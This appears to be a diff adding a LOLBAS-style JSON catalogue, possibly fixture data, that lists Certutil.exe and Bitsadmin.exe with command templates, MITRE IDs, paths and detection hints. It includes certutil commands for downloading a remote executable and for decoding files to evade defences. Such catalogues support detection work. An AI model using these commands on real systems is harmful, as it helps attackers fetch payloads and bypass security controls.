@@ -1,0 +1,76 @@
+[
+  {
+    "Name": "Certutil.exe",
+    "Description": "Windows binary used for handling certificates.",
+    "Author": "Oddvar Moe",
+    "Created": "2018-05-25",
+    "Commands": [
+      {
+        "Command": "certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe}",
+        "Description": "Download and save an executable to disk.",
+        "Usecase": "Download file from Internet",
+        "Category": "Download",
+        "Privileges": "User",
+        "MitreID": "T1105",
+        "OperatingSystem": "Windows 10, Windows 11"
+      },
+      {
+        "Command": "certutil -decode {PATH:.base64} {PATH}",
+        "Description": "Decode a Base64 encoded file.",
+        "Usecase": "Decode files to evade defensive measures",
+        "Category": "Decode",
+        "Privileges": "User",
+        "MitreID": "T1140",
+        "OperatingSystem": "Windows 10"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Path": "C:\\Windows\\System32\\certutil.exe"
+      },
+      {
+        "Path": "C:\\Windows\\SysWOW64\\certutil.exe"
+      }
+    ],
+    "Detection": [
+      {
+        "Sigma": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_certutil_download.yml"
+      },
+      {
+        "IOC": "Certutil.exe creating new files on disk"
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://example.com/certutil"
+      }
+    ],
+    "url": "https://lolbas-project.github.io/lolbas/Binaries/Certutil/"
+  },
+  {
+    "Name": "Bitsadmin.exe",
+    "Description": "Used for managing background intelligent transfer.",
+    "Commands": [
+      {
+        "Command": "bitsadmin /create 1",
+        "Usecase": "Download file from Internet",
+        "Category": "Download",
+        "Privileges": "User",
+        "MitreID": "T1105",
+        "OperatingSystem": "Windows 10, Windows 11"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Path": "C:\\Windows\\System32\\bitsadmin.exe"
+      }
+    ],
+    "Detection": [
+      {
+        "IOC": "Child process from bitsadmin.exe"
+      }
+    ],
+    "Resources": [],
+    "url": "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/"
+  }
+]
